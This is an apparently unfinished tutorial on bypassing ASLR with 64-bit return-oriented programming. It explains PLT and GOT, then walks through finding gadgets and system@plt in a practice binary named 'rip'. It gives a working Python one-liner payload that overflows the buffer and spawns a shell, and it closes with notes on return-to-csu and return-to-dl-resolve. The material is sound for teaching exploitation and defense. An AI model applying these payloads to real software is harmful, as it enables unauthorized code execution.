# 64 bit ROP With ASLR

sources:
https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html \
https://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-en-41595384 \
https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf \
https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems.pdf \
https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html \
http://shell-storm.org/talks/ROP_course_lecture_jonathan_salwan_2014.pdf \
https://exploit.courses/files/bfh2019/day5/0x53_ExploitMitigations_PIE.pdf \
https://ironhackers.es/en/tutoriales/pwn-rop-bypass-nx-aslr-pie-y-canary/ \
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html \
https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html \
http://blog.k3170makan.com/2018/11/introduction-to-elf-format-part-vii.html \
http://inaz2.hatenablog.com/entry/2014/10/12/191047 \
https://dangokyo.me/2018/01/27/extra-exploitation-technique-return-to-dl_resolve/ \
https://cs155.stanford.edu/papers/formatstring-1.2.pdf

Until now, we exploited without ASLR. Everytime
we got the address for a gadget or function in our
program or a loaded library, we knew it would be the
same when we launched our program again.

With ASLR, the addresses are randomized everytime
the program is run (hence the name Address Space
Layout Randomization). This means that even though
we got an address for a gadget or function under `gdb`,
that doesn't mean it will have the same address outside
`gdb`, or even in `gdb` again!

However, to randomize the address of a library or executable,
they need to have been compiled to position independent code. `libc`
does this, but sometimes executables do not (they use the `-no-pie`
flag).

To summarize: ASLR randomize the stack, the heap, libraries with
position independent code and the executable image if it also has
position independent code.

## Key Concepts

### PIE and PLT

#### PIE

`PIE` means Position Independet Executable. This
option is enabled by default and can be deactivated
with the `-no-pie` compilation flag.

What `PIE` does is produce code refer to resources
and addresses using a offset or other techniques. This
way the code can be placed anywhere in memory, since it
doesn't assume a fixed address for anything.

By using `-no-pie`, all the address in the executable
itself are always the same between executions, but with
ASLR, libc and other libraries are loaded to random addresses.

We will try to make a exploit only from what we can find in the
executable.

#### PLT

In the above explanation for `PIE`, we said that it
uses "offset or other techniques". One of these
"other techniques" is `PLT`.

`PLT` (Procedure Linkage Table) is a section always present
in the executable. What it does is create "stub" functions
for library functions.

These "stub" function are what we see in `gdb` and
`objdump` as `system@plt` or `printf@plt`. When we call
`<function>@plt` we aren't calling `<function>`, we are
jumping to the PLT section and from there being redirected
to the function.

##### PLT Under The Hood

If you launch `gdb rip` and catch a break at main, you 
can use `ni` to go to a `call <function>@plt` instruction
and use `si` to go inside it, to see how it is performed
at a lower level.

You should jump to three lines of instructions that look
like these:

```
Dump of assembler code for function puts@plt:
=> 0x00000000004004b0 <+0>:	jmp    QWORD PTR [rip+0x200b6a]        # 0x601020
   0x00000000004004b6 <+6>:	push   0x1
   0x00000000004004bb <+11>:	jmp    0x400490

```

This code is inside the `PLT` section. We can see that the
first instruction is a jump to the address stored at `rip+0x200b6a`.

Whatever address there is at `rip+0x200b6a`, it is the one we will
execute next. `rip+0x200b6a` or whatever address it happens to be
always belongs to the `GOT` section (Global Offset Table).

Obs.: Actually it is the `.got.plt` section, but you can ignore
that for now.

When we first call `<function>@plt`, the address we jump to is
actually the `push` instruction you see right below the first
`jmp` instruction:

```
   0x00000000004004b6 <+6>:	push   0x1
```

Why are we pushing a `0x1`? Every function called with the `PLT`
is associated with a number, in this case `puts@plt` is associated
with `0x1`.

After that, we jump to `0x400490`:

```
   0x00000000004004bb <+11>:	jmp    0x400490
```

And this doesn't take us to `puts`, why? Because we don't know
where `puts` is yet! This will execute some linker code that will
load the address of `puts` to the `GOT`.

Where exactly in the `GOT`? `rip+0x200b6a`. This way, next time
we call `puts@plt`, we will jump directly to the actual `puts`
function.

In short, the `PLT` is used to find and call
library functions that are randomly loaded somewhere.

## Plan of Attack

There are mainly two ways to defeat ASLR:

1. use anti ASLR resources (like executables addresses if using `-no-pie`)

2. get pointer leak (to find relevant addresses during execution)

It is tough to make a generalized attack that can work in multiple
situations, so we will take for granted some aspects about the
executable when necessary. 

One assumption we make in all these cases is that the program takes
the input as a stream of bytes (we can freely use the null byte).

These exploits will use the `-no-pie` flag:

* [No PIE, No Libc, No Problem](#no-pie-no-libc-no-problem)

* [Leak Pointers And Get Root](#leak-pointers-and-get-root)

These exploits won't:

* [Format String Vulnerabilities](#format-string-vulnerabilities)

* [Return2dl\_resolve](return2dl-resolve)

## No PIE, No Libc, No Problem

Using the `PLT` we can easily return to any function used in a
`-no-pie` compiled executable. Let's try calling `system@plt`
with "/bin/sh" as argument.

For that we will need to find:

* `system@plt`

* "/bin/sh"

* `pop rdi; ret`

### `system@plt`

To get the `system@plt` address, one easy way of doing it is
with `objdump -M intel -D rip | grep system@plt`:

```
00000000004004c0 <system@plt>:
  4005e1:	e8 da fe ff ff       	call   4004c0 <system@plt>
```

Now we know the `system@plt` address is `0x4004c0`.

### "/bin/sh"

Now we need to find a "/bin/sh" string in the executable. We can
easily check the constant strings in the executable with
`readelf -p .rodata rip` and filter our results with `grep`. By using
`readelf -p .rodata rip | grep "/bin/sh" we get`:

```
```

Well... nothing. But we can also try just "sh", since "/bin/sh"
is usually also in the PATH. `readelf -p .rodata rip | grep sh`
returns:

```
  [    12]  secret_hash
  [    38]  i don't feel like giving you a shell though
```

The second result doesn't work. We would be invoking
`shell though`, which doesn't really do anything.

The first result though, can be used! To get the exact address of
the `sh` substring, we just need to add `0x12` + `0x9` = `0x1b`
(offset of `secret_hash` to the beginning of the `rodata` section
and offset of `sh` substring to the beginning of `secret_hash`).

Now we just need to add `0x1b` to the offset of the `rodata` section
from the beginning of the executable, which we can get with 
`readelf --sections rip | grep rodata`:

```
  [15] .rodata           PROGBITS         0000000000400700  00000700
```

`0x400700` + `0x1b` = `0x40071b`

### `pop rdi`

At this point, we already this over and over. Just use `objdump` and
`grep` to get the gadget. If i use
`objdump -D -M intel rip | grep -A 1 "pop.*rdi" | grep -B 1 ret` i get:

```
```

Well... nothing. Looks like this will be more complicated.

Let's take a closer look at the output from
`objdump -M intel -D rip | grep pop`:

```
  400390:	5f                   	pop    rdi
  40039c:	5f                   	pop    rdi
  4003a2:	5f                   	pop    rdi
  4003a3:	5f                   	pop    rdi
  4003a9:	43 5f                	rex.XB pop r15
  4004e5:	5e                   	pop    rsi
  40052f:	5d                   	pop    rbp
  400540:	5d                   	pop    rbp
  40057d:	5d                   	pop    rbp
  400588:	5d                   	pop    rbp
  4005a2:	5d                   	pop    rbp
  4005d0:	5d                   	pop    rbp
  4005e7:	5d                   	pop    rbp
  4006da:	5b                   	pop    rbx
  4006db:	5d                   	pop    rbp
  4006dc:	41 5c                	pop    r12
  4006de:	41 5d                	pop    r13
  4006e0:	41 5e                	pop    r14
  4006e2:	41 5f                	pop    r15
```

We can see in the middle column the opcodes for the commands.
The gadget that is relevant to us `pop rdi` has the opcode
`5f`, so let's try finding gadgets with the opcode `5f`
with `objdump -D -M intel rip | grep -A 1 5f | grep -B 1 ret`:

```
  4006e2:	41 5f                	pop    r15
  4006e4:	c3                   	ret    
```

At first glance, that is not the gadget we are looking for,
but in reality the gadget we want really is just `5f` followed
by `c3` (pop rdi; ret). So we can just use `0x4006e3` to get the
`5f c3` sequence.

### Putting It All Together

Our payload should look like this:

```
fill buufer + pop rdi; ret + "sh" + system@plt
```

Putting it all in a one-liner give us:

```
(python3 -c "__import__('sys').stdout.buffer.write(b'A' * 0x80 + b'BBBBBBBB' + b'\xe3\x06\x40\x00\x00\x00\x00\x00' + b'\x1b\x07\x40\x00\x00\x00\x00\x00' + b'\xc0\x04\x40\x00\x00\x00\x00\x00' )"; cat) | ./rip
```

### Return to Csu

### Leak Pointers

### Return to Register

### Return to Vuln

### Byte Wise Bruteforcing

### Format String

## Notes

defeat ASLR:

1) use anti ASLR resources (absolute paths)

2) get pointer leak

GOT is where the address of library functions is loaded to

PLT is the entry point to jump to each address place in GOT
or look for the address if its not yet in GOT (if the function wasn't called yet)

1) making return-to-dl-resolve more robust

libc\_csu\_init has some interisting code, and is present in
almost all binaries.

one snippet set argument registers from other registers.

another snippet pop to these registers.

send RSP to a fixed address, then you can send a ROP sequence
using fixed addresses. (stack pivoting)

determining function library addresses: read the address of 
`__libc_start_main` function on GOT add offset of function from library
to the address. (need to know offset -> need to know libc version)

return-to-dl-resolve, by nergal

summary:
	1) use libc_csu_init gadgets for function call
	2) send ROP sequence to fixed address by using IO primitives
	3) Do DT_DEBUG traversal and determine the address of _dl_runtime_resolve
	4) call "system" using Return-to-dl-resolve

2) making just-in-time code reuse more robust

ret1vuln -> return to the same vulnerable function repetatly

summary:
	1) read the address of __libc_start_main function in GOT
	2) read about 0x160000 bytes from above address
	3) construct a ROP sequence to execute system call by using ROP gadgets in read-out memory
